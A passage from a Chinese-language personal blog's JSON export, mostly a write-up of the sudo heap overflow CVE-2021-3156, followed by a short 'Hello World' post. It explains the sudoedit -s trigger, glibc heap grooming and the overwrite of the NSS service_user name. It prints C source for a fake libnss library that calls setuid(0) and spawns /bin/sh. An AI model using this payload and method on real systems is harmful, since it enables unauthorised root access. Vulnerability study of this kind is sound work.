MODE_SHELL|MODE_LOGIN_SHELL)) &#123; &#125;&#125;//escape meta char conditionif (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; //.. &#125; 1234567891011121314151617181920212223242526#define MODE_NONINTERACTIVE 0x00800000#define MODE_SHELL 0x00020000//parse_args.ccase &#x27;e&#x27;: if (mode &amp;&amp; mode != MODE_EDIT) usage_excl(1); mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; valid_flags = MODE_NONINTERACTIVE;//这里 break; //...case &#x27;l&#x27;: if (mode) &#123; if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(1); &#125; mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;//这里 //...if ((flags &amp; valid_flags) != flags) usage(1); ​ 最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，parse_args函数会自动设置MODE_EDIT，并且不会重置valid_flags，而valid_flags默认包含了MODE_SHELL。 123456789101112131415/* * Default flags allowed when running a command. */#define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)int valid_flags = DEFAULT_VALID_FLAGS; /* First, check to see if we were invoked as &quot;sudoedit&quot;. */ proglen = strlen(progname); if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) &#123; progname = &quot;sudoedit&quot;; mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; &#125; ​ 也就是说，加入我们执行sudoedit -s，就同时兼具了MODE_SHELL|MODE_EDIT而没有MODE_RUN，因此可以成功到达漏洞点。 一个溢出demo： 1.堆溢出分析1.堆在内存中的位置 2.堆的结构 arena：通过sbrk或mmap系统调用为线程分配的堆区，按线程的类型可以分为2类： main arena：主线程建立的arena； thread arena：子线程建立的arena； bin：一个用以保存Free chunk链表的表头信息的指针数组，按所悬挂链表的类型可以分为4类: Fast bin：Fast bin 共有10个，存储了chunk size 从16到80的free chunk，这些free chunk被称作fast chunk Unsorted bin：当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。 Small bin：小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。 Large bin：大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。 PS:libc2.26 之后的 Tcache 机制 Tcache bin :类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。 区别：Max fast bins size is 0x80. Max tcache bins size is 0x410 mutex：互斥锁，防止多线程对chunk资源的竞争 Large bin： chunk：逻辑上划分的一小块内存，根据作用不同分为4类： Allocated chunk：即分配给用户且未释放的内存块； Free chunk：即用户已经释放的内存块； Top chunk：处于一个arena的最顶部的chunk Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。 标志位： A:记录当前chunk是否属于主线程 M:记录当前chunk是否是由mmap分配 P:记录前一个chunk块是否被分配 Malloc Algorithm： 1.若malloc请求大小与tcache中某个chunk大小完全匹配，优先从tcache bins调用而不必向large bin发出请求。 2.若请求内存足够大，则调用mmap()直接向操作系统从内存中调用 3.若fast bin中有合适大小的块，则先从中分配 TO be continued…. Free Algorithm： 1.若tcache bins有空间，则优先将空闲块放入其中 2.如果块足够小，则优先放入fast bins中 TO be continued…. 从该调度算法可以看出，某个具体大小的chunk可以在tcache bins 中稳定存在一定时间并且不发生合并，这个机制可以为我们精准溢出到某个结构体前面附近提前进行占位。 漏洞利用思路：利用溢出覆写nss_library为X/X，从而加载自定义的库函数，进而get root shell。 知识背景： 1.glibc setlocalemain()函数较早调用了setlocale()函数，查阅源码我们发现此处进行了malloc操作，这样可以分配并释放几个LC环境变量（LC_CTYPE，LC_MESSAGES，LC_TIME等），这样就在Sudo的堆开头处留下了空闲的fast/tcache chunks 12345678// /src/sudo.c150: int main(int argc, char *argv[], char *envp[])151: &#123; ...171: setlocale(LC_ALL, &quot;&quot;); ...216: sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add); 总之我们可以通过设置环境变量对堆进行修饰，得到指定大小的空闲chunk 并且该块在NSS结构体之前。由malloc机制不难分析出，我们控制好溢出大小很容易在tcache或者fast bins中占有该空闲块。 2.NSS（Name Service Switch）​ 每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看/etc/resolv.conf配置文件的内容进行解析，对于用户和组来说，它会默认查看/etc/passwd和/etc/group。其配置文件位于/etc/nsswitch.conf，其每行都规定了查找方法的规范，在GNU C Library里, 每个可用的SERVICE都必须有文件 /lib/libnss_SERVICE.so.1 与之对应。****也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库。** 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 1. service_user 结构typedef struct service_user&#123;/* And the link to the next entry. */struct service_user *next;/* Action according to result. */lookup_actions actions[5];/* Link to the underlying library object. */service_library *library;/* Collection of known functions. */void *known;/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...). */char name[0];&#125; service_user;// 2. nss_load_library() 函数static int nss_load_library (service_user *ni)&#123;if (ni-&gt;library == NULL) &#123; static name_database default_table; ni-&gt;library = nss_new_service (service_table ?: &amp;default_table, // （1）设置 ni-&gt;library ni-&gt;name); if (ni-&gt;library == NULL) return -1; &#125;if (ni-&gt;library-&gt;lib_handle == NULL) &#123; /* Load the shared library. */ size_t shlen = (7 + strlen (ni-&gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, // （2）伪造的库文件名必须是 libnss_xxx.so &quot;libnss_&quot;), ni-&gt;name), &quot;.so&quot;), __nss_shlib_revision); ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); // （3）加载目标库 //continue long long function 分析代码可知：如果溢出后可以覆盖service_user结构。该结构出现在libc的nss_load_library()函数中，用于加载动态链接库。如果能覆盖service_user-&gt;name，就能指定加载我们伪造的库，利用root权限运行非root权限的库。 我们要做的就是利用溢出部分将ni-&gt;library == null，所以找到距离我们占位块最近的一个service_user结构体即可。 gdb调试技巧： search -s systemd 和 search -s mymachine 定位出现的结构体，找到位置最合适的一个。 Demo: 最后一步：伪造libnss_X/X.so.2库 Demo: 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;static int __attribute__((constructor)) ___init(void)&#123; char *argv[2] = &#123;&quot;sh&quot;, NULL&#125;; setuid(0); setgid(0); seteuid(0); setegid(0); return execve(&quot;/bin/sh&quot;, argv, NULL);&#125; 加载该库函数即可get shell. 总结基本思路是：通过输入特定环境变量，使得释放特定大小LC_ALL变量堆块占位到service_user结构体上方为目标来进行，使得service结构体加载自定义库函数。 在阅读Qualys的报告时注意到，在寻找利用点时使用了fuzz的方法，找到了三个较为稳定的利用点，这点值得以后深入了解。","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"}]},{"title":"Hello World","slug":"hello_world","date":"2021-04-08T03:20:01.320Z","updated":"2021-04-08T17:06:24.341Z","comments":true,"path":"2021/04/08/hello_world/","link":"","permalink":"http://example.com/2021/04/08/hello_world/","excerpt":"","text":"一个新的开始 “我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。” ​ 几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。 :) Hello world.","categories":[{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}],"categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"},{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"},{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"},{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}